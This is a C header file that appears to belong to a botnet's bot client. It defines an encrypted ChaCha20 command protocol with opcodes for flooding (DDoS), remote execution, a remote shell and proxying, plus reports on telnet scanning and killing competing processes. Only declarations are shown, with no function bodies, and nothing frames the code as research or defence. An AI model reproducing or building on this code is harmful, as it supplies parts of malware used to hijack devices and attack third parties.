#ifndef CLIENT_H
#define CLIENT_H

#include <poll.h>
#include <stdbool.h>
#include <stdint.h>
#include <time.h>

#include "bot/utils/bytebuf.h"
#include "crypto/chacha20.h"

#define CLIENT_PADDING_MIN 64
#define CLIENT_PADDING_MAX 128

enum {
  // connection & authentication
  REQ_INIT,
  REQ_KEY_EXCHANGE,
  REQ_VERIFICATION,
  REQ_IDENTIFY,

  // session & control
  CMD_PING,
  CMD_EXIT,

  // system & admin
  CMD_FLOOD,
  CMD_EXEC,
  CMD_MODIFY_DOMAIN,
  CMD_SHELL,
  CMD_PROXY,

  // report opcodes
  REPORT_BANNER = 100,
  REPORT_TELNET = 101,
  REPORT_LOCK = 200, // unused
  REPORT_KILL = 201, // used
  REPORT_SPEEDTEST = 202,
};

typedef struct __attribute__((packed)) {
  uint8_t command;
  uint8_t padding;
  uint16_t len;
  uint32_t checksum;
} client_header_t, *pclient_header_t;

typedef struct {
  int fd;
  time_t last_recv;
  uint32_t address;

  uint8_t key[CHACHA20_KEY_SIZE];
  uint8_t nonce[CHACHA20_NONCE_SIZE];

  char name[33];
  uint32_t hash;

  // data that we received
  uint8_t *data;
  client_header_t hdr;

  enum {
    CLIENT_STATE_PENDING,
    CLIENT_STATE_HANDOVER,
    CLIENT_STATE_VERIFY,
    CLIENT_STATE_IDENTIFY,
    CLIENT_STATE_CONNECTED,
  } state;
} client_t, *pclient_t;

void client_connect(pclient_t client);
void client_close(pclient_t client);

void client_write(pclient_t client, uint8_t command, pbytebuf_t buf);
bool client_read(pclient_t client);

void client_events(pclient_t client, struct pollfd fd);
bool client_handle_states(pclient_t client);

#endif
